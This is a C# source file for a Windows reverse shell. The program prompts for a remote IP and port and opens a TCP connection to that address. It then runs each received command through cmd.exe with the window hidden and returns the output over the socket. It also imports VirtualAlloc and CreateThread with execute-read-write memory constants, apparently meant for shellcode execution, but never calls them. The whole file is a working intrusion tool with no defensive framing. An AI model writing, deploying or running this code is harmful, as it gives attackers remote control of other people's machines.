using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;

namespace CombinedShell
{
    class Program
    {
        [DllImport("kernel32.dll")]
        private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        private const uint MEM_COMMIT = 0x1000;
        private const uint PAGE_EXECUTE_READWRITE = 0x40;

        static void Main(string[] args)
        {
            Console.Write("Enter the remote IP address: ");
            string remoteAddress = Console.ReadLine();
            Console.Write("Enter the remote port: ");
            if (!int.TryParse(Console.ReadLine(), out int remotePort))
            {
                Console.WriteLine("Invalid port. Exiting.");
                return;
            }

            ExecuteReverseShell(remoteAddress, remotePort);
        }

        static void ExecuteReverseShell(string remoteAddress, int remotePort)
        {
            try
            {
                using (var client = new TcpClient(remoteAddress, remotePort))
                using (var stream = client.GetStream())
                using (var reader = new StreamReader(stream))
                using (var writer = new StreamWriter(stream))
                {
                    writer.AutoFlush = true;
                    writer.WriteLine("Reverse shell connection established.");

                    string cmd = string.Empty;
                    while ((cmd = reader.ReadLine()) != null)
                    {
                        if (string.IsNullOrWhiteSpace(cmd) || cmd.ToLower().Trim() == "exit")
                            break;

                        using (var proc = new Process())
                        {
                            proc.StartInfo = new ProcessStartInfo
                            {
                                FileName = "cmd.exe",
                                Arguments = "/c " + cmd,
                                UseShellExecute = false,
                                RedirectStandardOutput = true,
                                RedirectStandardError = true,
                                CreateNoWindow = true
                            };
                            proc.Start();

                            writer.WriteLine(proc.StandardOutput.ReadToEnd());
                            writer.WriteLine(proc.StandardError.ReadToEnd());
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error establishing reverse shell: {ex.Message}");
            }
        }
    }
}
